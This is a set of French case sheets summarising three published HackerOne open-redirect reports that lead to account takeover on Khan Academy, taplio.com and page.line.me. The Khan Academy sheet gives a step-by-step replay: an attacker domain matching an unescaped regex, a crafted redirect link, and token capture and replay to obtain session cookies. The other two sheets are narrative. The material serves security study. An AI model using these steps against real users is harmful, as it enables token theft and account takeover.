# Fiches SSS — Open Redirect Chains

*3 cas sélectionnés dans le corpus 2025-2026 (HackerOne).*

### 1-Click Account Takeover via Open Redirect through Regex Bypass in Domain Validation

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/3723458)

Le paramètre `continue` de `*.khanacademy.org` déclenche l'authentification inter-domaines : un token de transfert à usage unique est généré et transmis dans l'URL de redirection. La validation `isKhanAcademyUrl()` repose sur `KA_DOMAIN_REGEX`, où les points de `uc.a.run.app` ne sont pas échappés : n'importe quel caractère peut donc remplacer un point. L'attaquant enregistre `xfarr-6fmjyrz2lq-uc-a-run.app` (les tirets « matchent » les points non échappés) et envoie à la victime un lien `https://classroom.khanacademy.org/login?continue=...` ; la victime est redirigée vers `https://xfarr-...app/transfer_auth?key=<TOKEN>&continue=/`, le token est capturé côté attaquant (non consommé, car le JavaScript Khan Academy ne tourne pas sur ce domaine) puis rejoué sur un domaine Khan Academy légitime, qui émet les cookies `KAAS`, `KAAL`, `KAAC` et `reauth_token` : prise de contrôle complète. L'analyse de code a été facilitée par le source map `khanacademy.<hash>.js.map` laissé en production sur le CDN.

**Cause racine :** points non échappés dans `KA_DOMAIN_REGEX` (le `.` accepte les tirets) ; le token d'authentification est transporté en URL vers des hosts validés par cette regex.

**Preuve technique (verbatim depuis la source) :**

```js
KA_DOMAIN_REGEX = /(^|\.)(khanacademy\.(org|dev|test|local)|kastatic\.org|.*-6fmjyrz2lq-uc.a.run.app)$/
```
```text
Intended:   legitimate-service-6fmjyrz2lq-uc.a.run.app    ✓ matches (Legit Cloud Run service)
Unintended: xfarr-6fmjyrz2lq-uc-a-run.app    ✓ matches (Attacker-controlled)
```
```http
GET /transfer_auth?key=<TOKEN?>&continue=/ HTTP/1.1
Host: xfarr-6fmjyrz2lq-uc-a-run.app
```
```js
KA_DOMAIN_REGEX = /(^|\.)(khanacademy\.(org|dev|test|local)|kastatic\.org|.*-6fmjyrz2lq-uc\.a\.run\.app)$/
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : un domaine enregistrable passant le regex (ex. `xfarr-6fmjyrz2lq-uc-a-run.app`) et un listener HTTPS ; une victime avec un compte Khan Academy (connectée ou se connectant) ; un canal de livraison (e-mail, devoir Classroom, forum Discourse).
- Étapes : 1. enregistrer le domaine correspondant et monter un serveur HTTPS qui journalise les requêtes. 2. Envoyer à la victime le lien `https://classroom.khanacademy.org/login?continue=https%3A%2F%2Fxfarr-6fmjyrz2lq-uc-a-run.app%2F`. 3. À l'ouverture, `calculateNextUrl` traite `continue`, `isKhanAcademyUrl()` valide le host puis `maybeAddAuthTransfer()` / `createTransferAuthTokenMutation` génère le token et redirige vers `https://xfarr-6fmjyrz2lq-uc-a-run.app/transfer_auth?key=<TOKEN>&continue=/` (la victime voit un 404). 4. Extraire `key` des logs (token non consommé, donc encore valide en base). 5. Dans un navigateur incognito, ouvrir l'URL `transfer_auth?key=<TOKEN>` sur un domaine Khan Academy légitime : `transferAuthMutation` échange le token et émet `KAAS`/`KAAL`/`KAAC`/`reauth_token`. 6. Naviguer en tant que victime.
- Pièges / limites : chaque point de `uc.a.run.app` peut être remplacé par un tiret ; le domaine exact de rejeu (sous-domaine KA) n'est pas précisé dans la source ; le segment `-6fmjyrz2lq-` est propre au projet Cloud Run visé ; le token reste valide tant qu'il n'est pas consommé.

**Reproductibilité :** moyenne — chaîne et lien exacts fournis, mais exigent l'enregistrement d'un domaine et un clic de la victime.

**Techniques :** unescaped regex dot, domain validation bypass, open redirect, auth token in url, token replay, cross-domain authentication abuse, source map leak

**Correspond aux classes qualifiantes :** open redirect, ato, info disclosure (source map)

**Signal (endpoints/fonctions observés) :**
- `KA_DOMAIN_REGEX`, `isKhanAcademyUrl()`, `calculateNextUrl`
- `maybeAddAuthTransfer()` / `createTransferAuthTokenMutation`, `/transfer_auth?key=`
- cookies `KAAS`, `KAAL`, `KAAC`, `reauth_token`
- `https://cdn.kastatic.org/khanacademy/khanacademy.<hash>.js.map`

**Paramètres impliqués :** `continue`, `key`

### Authentication Token Theft via Open Redirect in Callback URL Parameter

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/3419636)

Le programme lemlist décrit un open redirect dans le flux d'inscription par e-mail de taplio.com : l'attaquant modifie le paramètre `callbackUrl` pour le pointer vers un domaine contrôlé, puis la victime, après avoir cliqué le lien de vérification reçu par e-mail, est redirigée vers ce domaine avec ses tokens d'authentification. La redirection fait partie du flux normal d'inscription, ce qui rend l'attaque crédible et n'exige qu'une interaction minimale. La source précise : « When a victim completes the email verification process by clicking the verification link, they are redirected to the malicious domain along with their authentication tokens. » (Texte issu du résumé d'équipe du rapport, champ `vulnerability_information` vide.)

**Cause racine :** validation insuffisante de la valeur de `callbackUrl` dans le flux d'inscription ; les tokens d'authentification sont inclus dans la redirection vers l'URL fournie par l'utilisateur.

**Preuve technique :** aucune publiée dans la source (cas narratif).

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : accès au flux d'inscription par e-mail de taplio.com (création de compte) ; possibilité de modifier le paramètre `callbackUrl` avant son envoi ; un domaine attaquant pour recevoir la redirection et les tokens.
- Étapes : 1. initier l'inscription par e-mail et intercepter la requête contenant `callbackUrl`. 2. Remplacer sa valeur par l'URL du domaine attaquant. 3. Faire cliquer la victime sur le lien de vérification reçu par e-mail (comportement attendu du flux). 4. Capturer les tokens d'authentification transmis lors de la redirection automatique vers le domaine attaquant.
- Pièges / limites : la source ne fournit ni payload, ni requête HTTP, ni endpoint exact ; il s'agit d'un writeup narratif, donc les étapes ci-dessus se limitent aux éléments décrits.

**Reproductibilité :** basse — writeup narratif : ni payload ni étapes techniques détaillées dans la source.

**Techniques :** open redirect via callback url, auth token in redirect, email verification flow abuse, credential theft

**Correspond aux classes qualifiantes :** open redirect, ato (vol de tokens d'authentification)

**Signal (endpoints/fonctions observés) :**
- paramètre `callbackUrl` dans le flux d'inscription e-mail de taplio.com
- redirection automatique post-vérification d'e-mail transportant les tokens d'authentification

**Paramètres impliqués :** `callbackUrl`

### page.line.me Open Redirect Leading to OAuth Code Exposure

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3423013)

Le programme LY Corporation décrit un open redirect sur page.line.me, les destinations de redirection n'étant pas restreintes aux domaines de confiance. Abusé dans un flux d'autorisation OAuth 2.0, il permet d'envoyer la réponse d'autorisation vers un endpoint contrôlé par l'attaquant, exposant le code d'autorisation émis après authentification de la victime, échangeable ensuite contre un access token ; l'attaquant obtient alors un accès au compte avec les privilèges de la victime. La source précise : « This could expose the authorization code issued after successful user authentication, which may then be exchanged for a valid access token. » (Texte issu du résumé d'équipe du rapport, champ `vulnerability_information` vide.)

**Cause racine :** contrôle insuffisant de la destination de redirection sur page.line.me ; le code d'autorisation OAuth transite par cette redirection.

**Preuve technique :** aucune publiée dans la source (cas narratif).

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : un flux OAuth 2.0 impliquant page.line.me où la destination de redirection peut être influencée ; une victime qui s'authentifie ; un endpoint attaquant pour recevoir la réponse d'autorisation.
- Étapes : non documenté dans la source (aucune URL, aucun paramètre de redirection ni payload précisé).
- Pièges / limites : writeup narratif ; le paramètre vulnérable n'est pas nommé ; la durée de vie et l'usage unique du code d'autorisation ne sont pas précisés par la source.

**Reproductibilité :** basse — la source ne fournit ni paramètre vulnérable, ni URL, ni étapes techniques.

**Techniques :** open redirect, oauth authorization code leak, access token exchange, insufficient redirect validation

**Correspond aux classes qualifiantes :** open redirect, ato (vol de code d'autorisation / access token)

**Signal (endpoints/fonctions observés) :**
- page.line.me : redirections non restreintes aux domaines de confiance
- réponse d'autorisation OAuth 2.0 envoyée vers un endpoint contrôlé par l'attaquant

**Paramètres impliqués :** non documenté dans la source (paramètre de redirection non nommé)
